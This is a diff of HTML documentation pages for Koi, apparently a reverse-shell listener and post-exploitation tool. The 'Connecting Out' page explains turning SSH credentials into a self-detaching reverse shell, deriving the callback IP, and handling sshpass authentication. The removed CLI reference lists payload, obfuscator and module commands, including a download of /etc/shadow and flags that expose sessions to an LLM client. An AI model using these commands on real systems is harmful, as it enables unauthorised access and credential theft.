@@ -8,13 +8,13 @@
       
       
       
-        <link rel="canonical" href="https://b3rt1ng.github.io/koi-wiki/cli-reference/">
+        <link rel="canonical" href="https://b3rt1ng.github.io/koi-wiki/connect/">
       
       
-        <link rel="prev" href="../getting-started/">
+        <link rel="prev" href="../payloads/">
       
       
-        <link rel="next" href="../configuration/">
+        <link rel="next" href="../upgrading-sessions/">
       
       
         
@@ -25,7 +25,7 @@
     
     
       
-        <title>CLI Reference - Koi Documentation</title>
+        <title>Connecting Out - Koi Documentation</title>
       
     
     
@@ -78,7 +78,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#cli-reference" class="md-skip">
+        <a href="#connecting-out" class="md-skip">
           Skip to content
         </a>
       
@@ -113,7 +113,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              CLI Reference
+              Connecting Out
             
           </span>
         </div>
@@ -334,37 +334,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    CLI Reference
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../cli-reference/" class="md-nav__link">
         
   
   
@@ -380,225 +353,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#listener-commands" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Listener commands
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#session-signals" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Session signals
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#command-details" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Command details
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Command details">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#go-idtag" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        go &lt;id|tag&gt;
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#upgrade-idtag" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        upgrade &lt;id|tag&gt;
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#tag-idtag-name" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        tag &lt;id|tag&gt; [name]
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#setshell-idtag-type" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        setshell &lt;id|tag&gt; &lt;type&gt;
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#run-module-idtag-args" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        run &lt;module&gt; &lt;id|tag&gt; [args...]
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#connect-transport-target-args" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        connect &lt;transport&gt; &lt;target&gt; [args...]
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#payload-iface" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        payload [iface]
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#obfuscator-iface" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        obfuscator [iface]
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#stop-start" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        stop / start
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#logs" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        logs
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#standalone-commands" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Standalone commands
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Standalone commands">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#koi" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        koi
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#koireview" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        koireview
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#koifuscator" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        koifuscator
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -692,10 +446,37 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../connect/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Connecting Out
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -711,6 +492,103 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#usage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Usage
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-actually-happens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What actually happens
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#which-ip-does-the-payload-call-back-to" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Which IP does the payload call back to?
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#authentication-ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Authentication (ssh)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tab-completion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tab completion
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#things-to-keep-in-mind" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Things to keep in mind
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#adding-a-transport" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Adding a transport
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1163,10 +1041,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#listener-commands" class="md-nav__link">
+  <a href="#usage" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Listener commands
+        Usage
       
     </span>
   </a>
@@ -1174,10 +1052,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#session-signals" class="md-nav__link">
+  <a href="#what-actually-happens" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Session signals
+        What actually happens
       
     </span>
   </a>
@@ -1185,179 +1063,57 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#command-details" class="md-nav__link">
+  <a href="#which-ip-does-the-payload-call-back-to" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Command details
+        Which IP does the payload call back to?
       
     </span>
   </a>
-  
-    <nav class="md-nav" aria-label="Command details">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#go-idtag" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        go &lt;id|tag&gt;
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#upgrade-idtag" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        upgrade &lt;id|tag&gt;
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#tag-idtag-name" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        tag &lt;id|tag&gt; [name]
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#setshell-idtag-type" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        setshell &lt;id|tag&gt; &lt;type&gt;
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#run-module-idtag-args" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        run &lt;module&gt; &lt;id|tag&gt; [args...]
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#connect-transport-target-args" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        connect &lt;transport&gt; &lt;target&gt; [args...]
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#payload-iface" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        payload [iface]
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#obfuscator-iface" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        obfuscator [iface]
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#stop-start" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        stop / start
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#logs" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        logs
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#standalone-commands" class="md-nav__link">
+  <a href="#authentication-ssh" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Standalone commands
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Standalone commands">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#koi" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        koi
+        Authentication (ssh)
       
     </span>
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#koireview" class="md-nav__link">
+      
+        <li class="md-nav__item">
+  <a href="#tab-completion" class="md-nav__link">
     <span class="md-ellipsis">
       
-        koireview
+        Tab completion
       
     </span>
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#koifuscator" class="md-nav__link">
+      
+        <li class="md-nav__item">
+  <a href="#things-to-keep-in-mind" class="md-nav__link">
     <span class="md-ellipsis">
       
-        koifuscator
+        Things to keep in mind
       
     </span>
   </a>
   
 </li>
-        
-      </ul>
-    </nav>
+      
+        <li class="md-nav__item">
+  <a href="#adding-a-transport" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Adding a transport
+      
+    </span>
+  </a>
   
 </li>
       
@@ -1378,290 +1134,209 @@
 
 
 
-<h1 id="cli-reference">CLI Reference</h1>
-<h2 id="listener-commands">Listener commands</h2>
-<p>These commands are available from the main <code>koi</code> prompt.</p>
+<h1 id="connecting-out">Connecting Out</h1>
+<p>Most of the time Koi waits: you drop a payload somewhere, the target calls back, a session appears. The <code>connect</code> command reverses that. When you already own valid credentials for a host, Koi delivers the payload itself, over a channel you already have access to, and the session lands exactly like any other.</p>
+<p>It turns a credential into a session in one line.</p>
+<div class="highlight"><pre><span></span><code>koi ❯ connect ssh root@10.10.14.7
+</code></pre></div>
+<hr />
+<h2 id="usage">Usage</h2>
+<div class="highlight"><pre><span></span><code>connect &lt;transport&gt; &lt;target&gt; [args...]
+</code></pre></div>
+<p>Alias: <code>conn</code>.</p>
 <table>
 <thead>
 <tr>
-<th>Command</th>
-<th>Aliases</th>
-<th>Syntax</th>
-<th>Description</th>
+<th>Transport</th>
+<th>Target syntax</th>
+<th>Requires</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><code>ls</code></td>
-<td><code>l</code>, <code>list</code></td>
-<td><code>ls</code></td>
-<td>List all active sessions</td>
-</tr>
-<tr>
-<td><code>go</code></td>
-<td><code>g</code>, <code>interact</code></td>
-<td><code>go &lt;id\|tag&gt;</code></td>
-<td>Enter a session interactively</td>
-</tr>
-<tr>
-<td><code>upgrade</code></td>
-<td><code>u</code></td>
-<td><code>upgrade &lt;id\|tag&gt;</code></td>
-<td>Upgrade a session to a full PTY</td>
-</tr>
-<tr>
-<td><code>kill</code></td>
-<td>-</td>
-<td><code>kill &lt;id\|tag&gt;</code></td>
-<td>Terminate and remove a session</td>
-</tr>
-<tr>
-<td><code>tag</code></td>
-<td>-</td>
-<td><code>tag &lt;id\|tag&gt; [name]</code></td>
-<td>Assign or clear a tag on a session</td>
-</tr>
-<tr>
-<td><code>setshell</code></td>
-<td><code>sh</code></td>
-<td><code>setshell &lt;id\|tag&gt; &lt;type&gt;</code></td>
-<td>Manually set the OS type of a session</td>
-</tr>
-<tr>
-<td><code>run</code></td>
-<td>-</td>
-<td><code>run &lt;module&gt; &lt;id\|tag&gt; [args...]</code></td>
-<td>Run a module against a session</td>
-</tr>
-<tr>
-<td><code>modules</code></td>
-<td><code>mdls</code>, <code>mods</code></td>
-<td><code>modules</code></td>
-<td>List available modules</td>
-</tr>
-<tr>
-<td><code>reload</code></td>
-<td><code>refresh</code>, <code>rl</code></td>
-<td><code>reload</code></td>
-<td>Reload modules from disk</td>
-</tr>
-<tr>
-<td><code>connect</code></td>
-<td><code>conn</code></td>
-<td><code>connect &lt;transport&gt; &lt;target&gt; [args...]</code></td>
-<td>Deliver a payload over a channel you already own</td>
-</tr>
-<tr>
-<td><code>payload</code></td>
-<td><code>p</code></td>
-<td><code>payload [iface]</code></td>
-<td>Print reverse shell payloads</td>
-</tr>
-<tr>
-<td><code>obfuscator</code></td>
-<td><code>obs</code>, <code>cook</code></td>
-<td><code>obfuscator [iface]</code></td>
-<td>Open the interactive payload obfuscator</td>
-</tr>
-<tr>
-<td><code>logs</code></td>
-<td><code>log</code></td>
-<td><code>logs</code></td>
-<td>List recorded session logs</td>
-</tr>
-<tr>
-<td><code>start</code></td>
-<td>-</td>
-<td><code>start</code></td>
-<td>Resume accepting new connections</td>
-</tr>
-<tr>
-<td><code>stop</code></td>
-<td>-</td>
-<td><code>stop</code></td>
-<td>Pause the listener, refuse new connections</td>
-</tr>
-<tr>
-<td><code>help</code></td>
-<td><code>h</code>, <code>?</code></td>
-<td><code>help</code></td>
-<td>Show the command reference</td>
-</tr>
-<tr>
-<td><code>exit</code></td>
-<td><code>quit</code></td>
-<td><code>exit</code></td>
-<td>Shut down the listener cleanly</td>
+<td><code>ssh</code></td>
+<td><code>&lt;[user[:pass]@]host&gt;</code></td>
+<td><code>ssh</code> on your machine, <code>sshpass</code> for password auth</td>
 </tr>
 </tbody>
 </table>
-<hr />
-<h2 id="session-signals">Session signals</h2>
-<p>These key combinations work while inside an interactive session (<code>go &lt;id&gt;</code>):</p>
-<table>
-<thead>
-<tr>
-<th>Key</th>
-<th>Effect</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>Ctrl+Z</code></td>
-<td>Background the session and return to the listener prompt</td>
-</tr>
-<tr>
-<td><code>Ctrl+C</code></td>
-<td>Send <code>SIGINT</code> to the remote process (keeps the session alive)</td>
-</tr>
-<tr>
-<td><code>Ctrl+T</code></td>
-<td>Toggle <strong>screenable mode</strong>, masks all IP addresses in output</td>
-</tr>
-<tr>
-<td><code>Ctrl+O</code></td>
-<td>Toggle the listener on/off (pause or resume accepting new connections)</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h2 id="command-details">Command details</h2>
-<h3 id="go-idtag"><code>go &lt;id|tag&gt;</code></h3>
-<p>Enters a session. The behaviour depends on whether the session has been upgraded:</p>
-<ul>
-<li><strong>Upgraded (Linux PTY / ConPtyShell):</strong> raw terminal mode, every keystroke goes directly to the remote process.</li>
-<li><strong>Plain (not upgraded):</strong> line-by-line mode, input is buffered and sent on Enter. Output is decoded and printed as-is.</li>
-</ul>
-<p>Background with <code>Ctrl+Z</code> to return to the prompt without killing the session.</p>
-<hr />
-<h3 id="upgrade-idtag"><code>upgrade &lt;id|tag&gt;</code></h3>
-<p>Promotes a raw shell to a fully interactive PTY. The method depends on the detected OS:</p>
-<ul>
-<li><strong>Linux:</strong> tries <code>script</code>, then <code>socat</code>, then falls back to <code>/bin/bash -i</code>.</li>
-<li><strong>Windows:</strong> fetches and executes <a href="https://github.com/antonioCoco/ConPtyShell">ConPtyShell</a> via a local HTTP staging server.</li>
-</ul>
-<p>The session logger is started at this point. See <a href="../logs/">Logging &amp; Review</a>.</p>
-<hr />
-<h3 id="tag-idtag-name"><code>tag &lt;id|tag&gt; [name]</code></h3>
-<p>Assigns a short name to a session so you can reference it by tag instead of numeric ID. Omitting <code>name</code> clears the tag.</p>
-<div class="highlight"><pre><span></span><code>koi ❯ tag 1 dc01
-koi ❯ go dc01
-koi ❯ tag dc01          # clears the tag
-</code></pre></div>
-<p>Tags must be unique across active sessions. Once set, the tag appears in <code>ls</code> next to the session ID and is accepted anywhere an <code>&lt;id&gt;</code> is expected.</p>
-<hr />
-<h3 id="setshell-idtag-type"><code>setshell &lt;id|tag&gt; &lt;type&gt;</code></h3>
-<p>Manually overrides the OS type of a session when auto-detection fails. Valid types:</p>
-<table>
-<thead>
-<tr>
-<th>Value</th>
-<th>Alias</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>linux</code></td>
-<td>-</td>
-<td>Linux shell</td>
-</tr>
-<tr>
-<td><code>windows_ps</code></td>
-<td><code>ps</code>, <code>powershell</code></td>
-<td>Windows PowerShell</td>
-</tr>
-<tr>
-<td><code>windows_cmd</code></td>
-<td><code>cmd</code></td>
-<td>Windows cmd.exe</td>
-</tr>
-</tbody>
-</table>
-<div class="highlight"><pre><span></span><code>koi ❯ setshell 2 windows_ps
-koi ❯ setshell dc01 linux
-</code></pre></div>
-<p>This also adjusts the session encoding (<code>utf-8</code> / <code>cp1252</code>) and line ending (<code>\n</code> / <code>\r\n</code>).</p>
-<hr />
-<h3 id="run-module-idtag-args"><code>run &lt;module&gt; &lt;id|tag&gt; [args...]</code></h3>
-<p>Runs a post-exploitation module against a session. The module must be compatible with the session's OS type. Example:</p>
-<div class="highlight"><pre><span></span><code>koi ❯ run sysinfo 1
-koi ❯ run netscan 1 --no-scan
-koi ❯ run download 1 /etc/shadow -o shadow.txt
-</code></pre></div>
-<p>Type <code>modules</code> to see what is available. Each module's usage is shown if you omit the session id:</p>
-<div class="highlight"><pre><span></span><code>koi ❯ run download
-  ✖  Usage: run download &lt;id&gt; &lt;remote_path&gt; [-o &lt;local_path&gt;]
-</code></pre></div>
-<hr />
-<h3 id="connect-transport-target-args"><code>connect &lt;transport&gt; &lt;target&gt; [args...]</code></h3>
-<p>Turns credentials you already own into a session. Koi delivers a reverse shell payload over the given transport, the target calls back, and the result registers as an ordinary session.</p>
+<p>Everything after the target is passed straight through to the transport binary, so any flag you would normally use still works:</p>
 <div class="highlight"><pre><span></span><code>koi ❯ connect ssh root@10.10.14.7
 koi ❯ connect ssh root:hunter2@10.10.14.7
 koi ❯ connect ssh -p 2222 -i ~/.ssh/id_ed25519 deploy@10.10.14.7
+koi ❯ connect ssh -J bastion@1.2.3.4 root@10.0.0.9
 </code></pre></div>
-<p><code>ssh</code> is currently the only transport. Extra arguments are passed through to it untouched. The callback address is derived from your routing table, and the session survives the <code>ssh</code> process exiting. See <a href="../connect/">Connecting Out</a> for the full picture.</p>
+<p>The inline <code>user:pass@host</code> form is a Koi extension, <code>ssh</code> itself does not accept it. Koi splits the password out and feeds it to <code>sshpass</code> instead.</p>
 <hr />
-<h3 id="payload-iface"><code>payload [iface]</code></h3>
-<p>Prints ready-to-use reverse shell payloads for the given interface (or all interfaces if omitted).</p>
-<div class="highlight"><pre><span></span><code>koi ❯ payload eth0
-koi ❯ payload          # all interfaces
-</code></pre></div>
-<hr />
-<h3 id="obfuscator-iface"><code>obfuscator [iface]</code></h3>
-<p>Opens the interactive TUI obfuscator to layer obfuscation techniques on a payload. Can also be launched as a standalone command: <code>koifuscator [iface]</code>.</p>
-<hr />
-<h3 id="stop-start"><code>stop</code> / <code>start</code></h3>
-<p><code>stop</code> pauses the listener: the socket stays open but incoming connections are refused (except ConPtyShell callbacks for in-progress upgrades). <code>start</code> resumes accepting connections. The current prompt indicates the paused state with a <code>[PAUSED]</code> tag.</p>
-<hr />
-<h3 id="logs"><code>logs</code></h3>
-<p>Lists all session log files stored in <code>~/.koi/logs/</code>. Use <code>koireview &lt;name&gt;</code> to read one. See <a href="../logs/">Logging &amp; Review</a>.</p>
-<hr />
-<h2 id="standalone-commands">Standalone commands</h2>
-<h3 id="koi"><code>koi</code></h3>
-<div class="highlight"><pre><span></span><code>koi [-h] [-v] [--host HOST] [--port PORT] [--payloads [IFACE]] [--obfuscator [IFACE]]
-    [--keep-history | --strip-history] [--log | --no-log]
-    [--local | --no-local] [--local-prepare] [--purge-cache]
-    [--mcp] [--mcp-port PORT] [--mcp-allow-exec] [--mcp-token TOKEN]
-</code></pre></div>
-<p><code>--payloads</code> and <code>--obfuscator</code> print output and exit without starting the listener. <code>--purge-cache</code> (<code>-pc</code>) deletes all files stored in <code>~/.koi/cache/</code> and exits, <code>--local-prepare</code> (<code>-lp</code>) fills that same cache and exits, and <code>--local</code> (<code>-l</code>) then runs entirely from it with no external network calls.</p>
-<p>The opsec flags (<code>--keep-history</code> / <code>--strip-history</code>, <code>--log</code> / <code>--no-log</code>) and the mode flags (<code>--local</code> / <code>--no-local</code>, <code>--mcp</code>) take their default from <code>~/.koi/config.json</code>, so each has a counter-flag to override the config for a single run. The <code>--mcp</code> flags expose sessions and modules to an LLM client and are covered in <a href="../mcp/">MCP Server</a>. Full flag table in <a href="../getting-started/#cli-flags">Getting Started</a>.</p>
-<hr />
-<h3 id="koireview"><code>koireview</code></h3>
-<div class="highlight"><pre><span></span><code>koireview [log] [-c / --clear]
-</code></pre></div>
+<h2 id="what-actually-happens">What actually happens</h2>
+<p>The transport is only the <strong>delivery vector</strong>. It does not carry the session.</p>
+<ol>
+<li>Koi resolves the target hostname to an IP.</li>
+<li>It works out which of your local IPs routes toward that target (see below).</li>
+<li>It builds a POSIX-sh one-liner that spawns a reverse shell back to <code>&lt;that IP&gt;:&lt;listener port&gt;</code>.</li>
+<li>It runs the transport command with that one-liner as the remote command.</li>
+<li>The remote shell detaches itself (<code>setsid</code> + <code>nohup</code>) and calls back.</li>
+<li>The transport command exits.</li>
+<li>The callback hits the listener and registers as a normal session.</li>
+</ol>
+<p>Because of step 5, <strong>the session outlives the <code>ssh</code> process</strong>. <code>ssh</code> connects, fires the payload, and quits within a second or two, the shell it spawned keeps living on its own socket. Nothing downstream, modules, upgrades, logging, treats a <code>connect</code> session differently from one you caught by pasting a payload by hand.</p>
+<p>The delivered one-liner picks its interpreter at runtime, in this order:</p>
 <table>
 <thead>
 <tr>
-<th>Usage</th>
-<th>Effect</th>
+<th>Order</th>
+<th>Interpreter</th>
+<th>Result</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><code>koireview</code></td>
-<td>List all available log files</td>
+<td>1</td>
+<td><code>python3</code></td>
+<td>Full PTY on arrival, no <code>upgrade</code> needed</td>
 </tr>
 <tr>
-<td><code>koireview &lt;name&gt;</code></td>
-<td>Replay a session log with timestamps</td>
+<td>2</td>
+<td><code>python</code></td>
+<td>Full PTY on arrival, no <code>upgrade</code> needed</td>
 </tr>
 <tr>
-<td><code>koireview -c</code></td>
-<td>Delete all log files</td>
-</tr>
-<tr>
-<td><code>koireview &lt;name&gt; -c</code></td>
-<td>Delete a specific log file</td>
+<td>3</td>
+<td><code>bash</code></td>
+<td>Raw shell, run <code>upgrade &lt;id&gt;</code> to promote it</td>
 </tr>
 </tbody>
 </table>
-<p>See <a href="../logs/">Logging &amp; Review</a> for details.</p>
+<p>Koi then waits up to 8 seconds for the callback. If nothing arrives, the payload ran but could not reach you, egress from the target is filtered, or the host has neither Python nor Bash.</p>
 <hr />
-<h3 id="koifuscator"><code>koifuscator</code></h3>
-<div class="highlight"><pre><span></span><code>koifuscator [iface] [--port PORT]
+<h2 id="which-ip-does-the-payload-call-back-to">Which IP does the payload call back to?</h2>
+<p>This is decided per target, by your kernel's routing table. You never pick an interface.</p>
+<p>Koi opens a <strong>UDP</strong> socket toward the target and reads back the source address the kernel assigned to it:</p>
+<div class="highlight"><pre><span></span><code><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_DGRAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
+<span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">getsockname</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
 </code></pre></div>
-<p>Standalone obfuscator UI. Equivalent to running <code>koi --obfuscator</code> but without starting the listener. See <a href="../payloads/">Payloads &amp; Obfuscation</a>.</p>
+<p>Calling <code>connect()</code> on a UDP socket sends <strong>no packet</strong>. It is a purely local operation: the kernel consults its routing table, decides which interface it would use to reach that destination, and binds the socket to that interface's address. Reading <code>getsockname()</code> gives you that address. The port <code>80</code> is arbitrary and never used.</p>
+<p>The practical effect is that the callback address is always the right one for that specific target:</p>
+<table>
+<thead>
+<tr>
+<th>Situation</th>
+<th>IP baked into the payload</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Target on your LAN</td>
+<td>Your LAN address</td>
+</tr>
+<tr>
+<td>Target across a VPN</td>
+<td>Your <code>tun0</code> address</td>
+</tr>
+<tr>
+<td>Target in a local container</td>
+<td>Your bridge address (<code>docker0</code>, ...)</td>
+</tr>
+<tr>
+<td>Multi-homed operator box</td>
+<td>Whichever interface routes to that target</td>
+</tr>
+</tbody>
+</table>
+<p>This is also why <code>connect</code> takes no interface argument, while <code>payload</code> and <code>obfuscator</code> do. Those two do not know who they are talking to, so all they can do is list every interface and let you choose. <code>connect</code> knows the target, so it deduces.</p>
+<div class="admonition note">
+<p class="admonition-title"><code>--host</code> is a different thing</p>
+<p>The listener's <code>--host</code> (default <code>0.0.0.0</code>) only controls the <code>bind()</code>, which addresses Koi <em>accepts</em> on. It has no influence on the callback address written into the payload.</p>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">NAT breaks the deduction</p>
+<p>Routing gives you your <strong>local source address</strong>. If there is NAT between you and the target, for example Koi behind a home router and the target on the internet, the payload gets your private address and the callback never arrives. There is currently no way to override the callback IP on <code>connect</code>, so in that scenario fall back to <code>payload</code> and deliver the one-liner yourself.</p>
+<p>For the same reason, <code>connect</code> cannot be used through <a href="../go-online/">Torii</a>: it builds its own payload, without the 3-byte Torii header and with a routing-derived address, so the callback would never be routed. Torii payloads have to be crafted by hand.</p>
+</div>
+<hr />
+<h2 id="authentication-ssh">Authentication (ssh)</h2>
+<p>Koi settles authentication <em>before</em> running anything, so <code>ssh</code> never drops into its own password prompt, which would drag the host key question along with it into a half-driven terminal.</p>
+<table>
+<thead>
+<tr>
+<th>What you typed</th>
+<th>What Koi does</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>user:pass@host</code></td>
+<td>Uses <code>sshpass</code>, password passed through the <code>SSHPASS</code> environment variable, never on the command line</td>
+</tr>
+<tr>
+<td><code>-i &lt;key&gt;</code> present</td>
+<td>Nothing, <code>ssh</code> handles the key</td>
+</tr>
+<tr>
+<td>Just <code>user@host</code></td>
+<td>Prompts for the password itself, hidden input</td>
+</tr>
+<tr>
+<td>Just <code>user@host</code>, empty answer at the prompt</td>
+<td>Hands auth back to <code>ssh</code>, use this for agent or default keys</td>
+</tr>
+<tr>
+<td>Just <code>user@host</code>, no <code>sshpass</code> installed</td>
+<td>Skips the prompt, <code>ssh</code> will ask on its own</td>
+</tr>
+</tbody>
+</table>
+<p>A few details worth knowing:</p>
+<ul>
+<li><strong><code>sshpass</code> is required for password auth.</strong> With an inline password and no <code>sshpass</code> installed, Koi aborts and tells you. Key and agent auth need nothing extra.</li>
+<li><strong>The command stays in your history.</strong> An inline <code>user:pass@host</code> is recallable with ↑ like any other command, password included. Koi's history is in-memory only, never written to disk, and dies with the process.</li>
+<li><strong>Host keys are accepted on first sight.</strong> Koi injects <code>-o StrictHostKeyChecking=accept-new</code> unless you already passed your own <code>StrictHostKeyChecking</code> value, in which case yours wins.</li>
+<li><strong><code>sshpass</code> exit codes are translated.</strong> Code <code>5</code> is reported as <em>invalid or incorrect password</em>, code <code>6</code> as <em>host key unknown or changed</em>, rather than a bare number.</li>
+</ul>
+<hr />
+<h2 id="tab-completion">Tab completion</h2>
